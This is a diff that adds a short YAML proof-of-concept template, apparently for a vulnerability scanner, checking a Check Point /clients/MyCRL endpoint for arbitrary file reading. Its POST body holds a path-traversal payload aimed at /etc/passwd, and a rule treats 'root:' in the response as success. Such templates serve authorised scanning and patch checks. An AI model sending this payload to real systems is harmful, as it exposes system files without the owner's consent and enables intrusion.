@@ -1,0 +1,21 @@
+name: poc-yaml-CheckPoint-MyCRL-File-reading
+transport: http
+  
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /clients/MyCRL
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+
+      body: aCSHELL/../../../../../../../etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+expression: r0()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139344523
